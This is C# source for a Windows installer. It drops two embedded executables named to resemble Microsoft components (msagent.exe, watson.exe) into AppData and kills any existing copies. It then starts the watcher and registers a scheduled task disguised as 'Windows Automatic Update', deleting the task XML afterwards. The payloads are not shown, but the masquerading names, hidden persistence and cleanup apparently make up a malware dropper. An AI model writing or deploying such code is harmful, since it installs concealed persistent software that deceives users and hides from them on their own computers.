using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using System.IO;

namespace Install
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\msagent";
            string client = path + "\\msagent.exe";
            string watcher = path + "\\watson.exe";
            string taskXml = path + "\\task.xml";
            string sid = WindowsIdentity.GetCurrent().User.ToString();

            Directory.CreateDirectory(path);

            Process[] clientProcess = Process.GetProcessesByName("msagent");
            foreach (Process p in clientProcess)
            {
                p.Kill();
            }

            Process[] watsonProcess = Process.GetProcessesByName("watson");
            foreach (Process p in watsonProcess)
            {
                p.Kill();
            }

            System.IO.File.WriteAllBytes(client, Resource1.msagent);
            System.IO.File.WriteAllBytes(watcher, Resource1.watson);

            Process.Start(watcher);

            string taskContent = Resource1.task.Replace("{{ EXECUTABLE_PATH }}", watcher).Replace("{{ USER_SID }}", sid);
            System.IO.File.WriteAllText(taskXml, taskContent);
            Process schtasks = Process.Start("schtasks", String.Format("/create /XML \"{0}\" /tn \"Windows Automatic Update\"", taskXml));
            schtasks.WaitForExit();
            File.Delete(taskXml);
        }
    }
}
